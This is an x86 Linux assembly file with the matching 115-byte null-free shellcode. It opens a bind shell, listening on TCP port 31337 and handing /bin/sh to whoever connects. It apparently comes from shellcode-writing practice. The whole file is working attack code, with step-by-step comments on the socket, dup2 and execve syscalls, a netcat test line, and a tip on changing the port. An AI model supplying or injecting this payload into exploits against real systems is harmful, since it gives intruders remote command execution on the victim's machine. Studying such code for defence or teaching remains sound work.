; This assembly code binds /bin/sh to a local port 31337
; 
; create elf32 executable with: ./compile.sh bind_tcp_shellcode
;
; You can then test this with: nc -nv 127.0.0.1 31337
;
; some nifty details
; -^- 115 bytes
; -^- zero zero's
; bind port can be changed easily by changing the last two bytes of the shellcode !

; full shellcode bytes:
;
; "\xeb\x69\x5d\x8b\x6d\x00\x31\xc0\xb0\x66\x31\xdb\x43\x31\xf6\x56"
; "\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x56\x66\x55"
; "\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x89\xf0\x89"
; "\xc3\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56"
; "\x57\x89\xe1\xcd\x80\x89\xc7\x89\xfb\x31\xc9\xb1\x02\xb0\x3f\xcd"
; "\x80\x49\x79\xf9\xb0\x0b\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
; "\x6e\x89\xe3\x56\x53\x89\xe1\x89\xf2\xcd\x80\xe8\x92\xff\xff\xff"
; "\x7a\x69"
;

section .text
global _start

_start:

    jmp short set_port

rocknroll:
    pop ebp                  ; pop the port value's address
    mov ebp, [ebp]           ; get value off popped address

    ; first: create a socket
    ; int fd = socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_IP=0) 

    xor eax, eax
    mov al, 102             ; eax: syscall 102: socketcall

    xor ebx, ebx
    inc ebx                 ; ebx: call = 1 (sys_socket)

    xor esi,esi             ; we'll use esi to be our alway-zero-shellcode-bytesaver :-)

    push esi                ; protocol: 0   = IPPROTO_IP
    push ebx                ; type:     1   = SOCK_STREAM
    push byte 0x2           ; domain:   2   = AF_INET

    mov ecx,esp             ; ecx: args array structure
    int 0x80                ; trigger syscall

    ; save the socketfd

    mov edi, eax

    ; now we bind the socket to 0.0.0.0 port 31337
    ;
    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
    ; bind(fd, [AF_INET=2, 31337, 0], 16)

    xor eax, eax
    mov al, 102             ; eax: syscall 102 (socket)

    ; build sockaddr struct

    push esi                ; address: 0 (0.0.0.0 -> any)

    push bp                 ; port: 31337 (reverse 0x7a69)

    inc ebx
    push bx                 ; AF_INET = 2
    mov ecx,esp             ; write struct to ecx

    ; construct bind() arguments

    push byte 16            ; addrlen = 16 bits = 4 bytes (0.0.0.0)
    push ecx                ; addr
    push edi                ; sockfd
    mov ecx,esp             ; arg array for syscall

    int 0x80                ; trigger syscall

    ; next setup listen() to listen for connections
    ;
    ; int listen(int sockfd, int backlog);

    mov eax, esi
    mov ebx, eax
    mov al, 102             ; socket syscall
    mov bl, 4               ; type 4 = listen()

    push esi                ; backlog = 0
    push edi                ; socketfd
    mov ecx,esp             ; write args to ecx
    int 0x80                ; trigger syscall

    ; after listen() follows accept()
    ;
    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

    mov al, 102             ; socket syscall
    inc ebx                 ; type 5 = accept()
    push esi                ; not required = NULL
    push esi                ; not required = NULL
    push edi                ; sockfd
    mov ecx,esp             ; setup args
    int 0x80                ; trigger syscall

    mov edi, eax            ; save fd

    ; now create copies of the 3 file descriptions 0 = STDIN, 1 = STDOUT, 2 = STDERR
    ; int dup2(int oldfd, int newfd);

    mov ebx, edi            ; socket fd
    xor ecx, ecx
    mov cl,0x2
loop:
    mov al, 63              ; dup2 syscall
    int 0x80
    dec ecx                 ; decrement until 0 to do (2->1->0)
    jns loop

    ; finally, execve /bin//sh
    ; int execve(const char *filename, char *const argv[],
    ;            char *const envp[]);

    mov al, 11              ; execve syscall 

    push esi                ; NULL terminator
    push dword 0x68732f2f   ; "//sh"
    push dword 0x6e69622f   ; "/bin"
    mov ebx,esp             ; filename = "/bin//sh\x0"

    push esi
    push ebx
    mov ecx, esp            ; argv = [filename, 0] 

    mov edx, esi            ; envp = NULL

    int 0x80                ; trigger syscall -> hello shell!

set_port:
    call rocknroll
    port: db 0x7a, 0x69     ; port 31337 (0x7a69)
